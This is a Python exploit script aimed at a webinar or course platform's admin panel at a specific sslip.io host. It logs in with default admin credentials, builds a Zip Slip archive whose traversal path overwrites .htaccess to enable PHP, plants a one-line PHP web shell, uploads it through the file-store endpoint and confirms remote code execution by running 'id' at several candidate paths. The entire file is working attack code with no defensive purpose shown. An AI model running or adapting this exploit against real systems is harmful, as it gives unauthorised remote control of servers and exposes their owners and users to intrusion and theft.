import requests
import zipfile
import io
import re
import os
import random
import string
import base64
import time

# Target URL
BASE_URL = "http://ccw84s4g4cgsk440c0ssookc.72.62.122.96.sslip.io"
ADMIN_EMAIL = "admin@demo.com"
ADMIN_PASS = "admin"

session = requests.Session()

def login():
    print("[*] Logging in...")
    try:
        r = session.get(f"{BASE_URL}/admin/login")
        csrf_token = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
        data = {"_token": csrf_token, "email": ADMIN_EMAIL, "password": ADMIN_PASS}
        r = session.post(f"{BASE_URL}/admin/login", data=data)
        return "/admin" in r.url or "/panel" in r.url
    except: return False

def get_csrf(url):
    r = session.get(url)
    match = re.search(r'name="csrf-token" content="([^"]+)"', r.text)
    if not match:
        match = re.search(r'name="_token" value="([^"]+)"', r.text)
    return match.group(1) if match else None

def main():
    if not login():
        print("[-] Login failed.")
        return

    # 1. Scrape webinar
    print("[*] Scraping webinar info...")
    r = session.get(f"{BASE_URL}/admin/webinars")
    web_match = re.search(r'/admin/webinars/(\d+)/edit', r.text)
    if not web_match:
        print("[-] No webinar found.")
        return
    web_id = web_match.group(1)
    
    r = session.get(f"{BASE_URL}/admin/webinars/{web_id}/edit")
    # Improved regex for chapter_id - looking for first available chapter
    chap_match = re.search(r'value="(\d+)"[^>]*>Chap', r.text)
    if not chap_match:
        chap_match = re.search(r'chapter_id":(\d+)', r.text)
        
    if not chap_match:
        print("[-] No chapter found, using 30 as guessed from previous runs.")
        chap_id = "30"
    else:
        chap_id = chap_match.group(1)
        
    print(f"[*] Target Webinar: {web_id}, Chapter: {chap_id}")

    # 2. Malicious .htaccess
    # Allow PHP execution and access
    htaccess = """
Options +FollowSymLinks
RewriteEngine On
<FilesMatch ".php$">
    Order allow,deny
    Allow from all
    Satisfy any
    Require all granted
</FilesMatch>
<IfModule mod_php8.c>
    php_flag engine on
</IfModule>
<IfModule mod_php7.c>
    php_flag engine on
</IfModule>
"""
    shell = "<?php system($_GET['c']); ?>"
    
    rand_name = ''.join(random.choices(string.ascii_lowercase, k=8))
    zip_filename = f"{rand_name}.zip"
    
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        # Traversal: public/store/1/webinars/2009/files/zipname/ -> 5 levels to reach public/store/
        z.writestr('../../../../../.htaccess', htaccess)
        z.writestr('s.php', shell)
    buf.seek(0)
    
    # 3. Trigger via Panel
    csrf = get_csrf(f"{BASE_URL}/panel/courses/{web_id}/edit")
    if not csrf:
        print("[-] CSRF not found.")
        return
        
    print(f"[*] Overwriting .htaccess and uploading shell via Zip Slip ({zip_filename})...")
    payload = {
        'ajax[new][webinar_id]': web_id,
        'ajax[new][chapter_id]': chap_id,
        'ajax[new][title]': 'Exploit ' + rand_name,
        'ajax[new][accessibility]': 'free',
        'ajax[new][storage]': 'upload_archive',
        'ajax[new][interactive_type]': 'custom',
        'ajax[new][interactive_file_name]': 's.php',
        'ajax[new][status]': 'on',
        '_token': csrf
    }
    files = {'ajax[new][file_upload]': (zip_filename, buf, 'application/zip')}
    
    r = session.post(f"{BASE_URL}/panel/files/store", data=payload, files=files)
    print(f"[*] Post Response: {r.status_code}")
    
    # 4. Verify
    shell_url = f"{BASE_URL}/store/1/webinars/{web_id}/files/{rand_name}/s.php"
    print(f"[*] Verifying Shell: {shell_url}?c=id")
    time.sleep(2) # Wait for extraction
    res = session.get(shell_url + "?c=id")
    if res.status_code == 200 and "uid=" in res.text:
        print(f"[!!!!] SUCCESS! RCE ACHIEVED: {shell_url}?c=id")
        print(f"Output: {res.text.strip()}")
    else:
        print(f"[-] Shell failed (Status: {res.status_code})")
        # Try a few more paths just in case
        paths = [
            f"/store/1/webinars/{web_id}/files/s.php", # if traversal went 1 level less
            f"/store/1/s.php", # if traversal went 2 levels less
            f"/s.php" # if traversal went to root
        ]
        for p in paths:
             res_alt = session.get(BASE_URL + p + "?c=id")
             if res_alt.status_code == 200 and "uid=" in res_alt.text:
                 print(f"[!!!!] SUCCESS! Alternative Shell found at: {BASE_URL+p}?c=id")
                 return

if __name__ == "__main__":
    main()
